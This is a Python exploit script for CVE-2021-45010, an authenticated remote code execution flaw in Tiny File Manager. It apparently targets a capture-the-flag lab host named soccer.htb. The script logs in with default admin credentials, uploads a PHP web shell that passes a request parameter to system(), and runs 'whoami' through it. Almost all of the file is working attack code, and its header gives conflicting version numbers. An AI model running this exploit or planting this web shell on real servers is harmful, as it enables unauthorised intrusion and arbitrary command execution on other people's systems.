#!/usr/bin/python3

'''
  Exploit Title: Tiny File Manager 2.4.6 (Authenticated) Remote Code Execution 
  Date: 04 Mar 2023
  Exploit Author: Syd 
  Software Link: https://github.com/prasathmani/tinyfilemanager
  Version: Tiny File Manager <= 2.4.3 
  Tested on: Ubuntu 20.04
  CVE : CVE-2021-45010
  Reference: https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
'''

import requests
import sys


init_req=requests.get("http://soccer.htb/tiny/tinyfilemanager.php")

Cookie=init_req.headers["Set-Cookie"].split(":")

Cookie=(Cookie[0].split(";"))[0]

print("[+] Got Cookie: ",Cookie)

Headers={
        "Host":"soccer.htb",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":"31",
        "Cookie":"{}".format(Cookie),
        "Connection":"close"
        }

auth_req = requests.post("http://soccer.htb/tiny/tinyfilemanager.php?p=",data="fm_usr=admin&fm_pwd=admin%40123",headers=Headers)

print("[+] Login Successful ",auth_req)

Data='''------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="p"

tiny/uploads
------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="fullpath"

shell.php
------WebKitFormBoundarycUYlvkDdcbxPEbF5
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php

if(isset($_REQUEST['cmd'])){
        echo " ";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo " ";
        die;
}

?>

------WebKitFormBoundarycUYlvkDdcbxPEbF5--
'''

Headers = {
        "Host": "soccer.htb",
        "Cookie":"{}".format(Cookie),
        "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarycUYlvkDdcbxPEbF5",
        "Content-Length":"551"
        }


file_upload = requests.post("http://soccer.htb/tiny/tinyfilemanager.php?p=tiny/uploads",headers=Headers,data=Data)
print('[+] Upload Successful')
whoami = requests.get("http://soccer.htb/tiny/uploads/shell.php?cmd=whoami")
print("[+] Trying 'whoami' />",whoami.text)
